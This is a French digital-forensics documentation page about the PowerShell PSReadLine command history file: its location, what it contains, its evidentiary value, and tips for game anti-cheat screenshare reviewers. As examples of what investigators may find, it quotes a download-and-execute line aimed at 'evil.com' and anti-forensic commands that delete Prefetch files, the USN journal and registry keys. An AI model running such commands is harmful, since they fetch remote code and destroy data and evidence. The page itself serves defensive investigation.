<!-- route: /advanced-explanation-of-artifacts/user-activity-and-knowledge/powershell-command-history -->
# Historique des commandes PowerShell

### But et fonctionnement

L'historique des commandes PowerShell est une fonction du module PSReadLine, l'éditeur de ligne de commande par défaut des consoles PowerShell modernes (Windows 10/11 et plus). Son but : sauvegarder l'historique des commandes tapées dans les sessions interactives, pour pouvoir les rappeler avec les flèches haut et bas.

Vue DFIR, cette fonction centrée utilisateur crée un journal en texte brut, chronologique, des actions d'un utilisateur en ligne de commande. Ça donne un enregistrement direct et mot pour mot de l'interaction manuelle, de l'exécution de scripts et d'éventuelles activités anti-forensiques.

### Emplacement et structure

L'historique est dans un simple fichier texte.

- Emplacement : `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
  - Soit en général : `C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

La structure est simple : chaque commande est ajoutée sur une nouvelle ligne. Le fichier ne stocke pas d'horodatage par commande, mais sa date de modification indique quand la dernière commande a été ajoutée (donc à la fermeture de la dernière session PowerShell interactive).

### Métadonnées stockées

L'artefact est simple : seulement les commandes brutes. Mais ces données sont très précieuses :

- **Commandes mot pour mot :** les commandes exactes, avec leurs paramètres et arguments. Ça révèle des chemins, des clés de registre manipulées, des URL accédées, des scripts encodés exécutés.
- **Ordre chronologique :** les commandes sont dans l'ordre d'exécution, à travers les sessions, ce qui donne une séquence logique.
- **Attribution utilisateur :** le fichier est dans le profil AppData d'un utilisateur précis, ce qui relie l'activité en ligne de commande à ce compte.

### Valeur forensique

L'historique PowerShell est inestimable pour reconstituer les actions manuelles.

- **Révéler l'anti-forensique manuelle :** un des meilleurs endroits pour trouver un effacement de preuves fait à la main. Des commandes comme `del C:\Windows\Prefetch\*.pf`, `fsutil usn deletejournal /D C:` ou `reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist` peuvent y être enregistrées mot pour mot.
- **Débusquer l'exécution "fileless" :** on y trouve les commandes initiales qui lancent du code sans fichier. Par exemple un téléchargement et une exécution en mémoire (`IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`) ou une commande encodée (`powershell.exe -EncodedCommand ...`).
- **Suivre la manipulation de fichiers :** les commandes de création, déplacement, renommage et suppression (`New-Item`, `Move-Item`, `Rename-Item`, `Remove-Item`).
- **Identifier la reconnaissance :** les commandes de collecte d'infos comme `Get-Process`, `Get-Service` ou l'énumération réseau.

À noter : ce fichier ne journalise que les sessions PowerShell interactives. Les commandes de scripts non interactifs lancés directement (clic droit > "Exécuter avec PowerShell") n'y apparaissent en général pas. Et un utilisateur averti peut supprimer `ConsoleHost_history.txt` pour effacer ses traces.

#### Points de réflexion (SS Contest)

Pour un SSer, ce fichier est la transcription directe de l'activité en ligne de commande du joueur, et un endroit de choix pour trouver la preuve d'une tentative de bypass.

- **Le journal des aveux :** ça se lit parfois comme des aveux. Trouver la commande exacte tapée pour supprimer le dossier Prefetch (`Remove-Item C:\Windows\Prefetch\* -Recurse`), vider une clé de registre ou lancer un script loader, c'est une preuve d'intention incontestable.
- **Exposer l'exécution d'une extension falsifiée :** si le joueur utilise `Start-Process C:\Users\Player\Desktop\cheat.tmp` pour lancer un cheat renommé, cette commande peut être dans l'historique, ce qui prouve directement l'exécution d'un exécutable déguisé.
- **Un check rapide et rentable :** pendant un screenshare, ouvrir `ConsoleHost_history.txt` dans Notepad est rapide et efficace. Un simple défilement peut révéler tout de suite une activité suspecte à creuser.
- **Preuve d'effacement :** si le fichier manque, ou si sa date de modification est très récente (donc vidé et recréé à l'instant), et que tu trouves des traces d'exécution de PowerShell ailleurs (Prefetch de `powershell.exe`, par exemple), tu as un bon dossier d'effacement de preuves.
